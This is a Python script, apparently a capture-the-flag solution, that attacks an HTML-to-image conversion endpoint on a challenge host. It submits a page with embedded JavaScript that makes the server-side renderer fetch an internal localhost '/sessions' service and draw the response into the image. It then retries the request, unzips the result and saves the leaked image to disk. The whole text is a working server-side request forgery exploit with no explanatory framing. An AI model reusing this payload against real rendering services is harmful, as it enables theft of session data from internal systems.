import requests, io, zipfile, time

BASE = 'http://fad4fa65501e0c52f811e82ff7b1afca.playat.flagyard.com'
js = '<!doctype html><html><body style="font:14px monospace;white-space:pre-wrap;word-break:break-all"><div id=o>x</div><script>var x=new XMLHttpRequest();x.open("GET","http://127.0.0.1:40003/sessions",false);x.send();document.getElementById("o").textContent="S:"+x.responseText;</script></body></html>'

for attempt in range(4):
    s = requests.Session(); s.headers.update({'User-Agent':'Mozilla/5.0'})
    try:
        r = s.post(BASE+'/html-to-image', json={'pages':[js]}, timeout=60)
        print(attempt, r.status_code, r.headers.get('Content-Type'))
        if r.status_code == 200 and 'zip' in r.headers.get('Content-Type',''):
            z = zipfile.ZipFile(io.BytesIO(r.content))
            for n in z.namelist():
                data = z.read(n)
                open('f:/mission-git-hackss/mission-git-hackss/sessions_retry.jpg','wb').write(data)
                print('saved', len(data))
            break
        else:
            print(r.text[:150])
    except Exception as e:
        print('err', e)
    time.sleep(3)
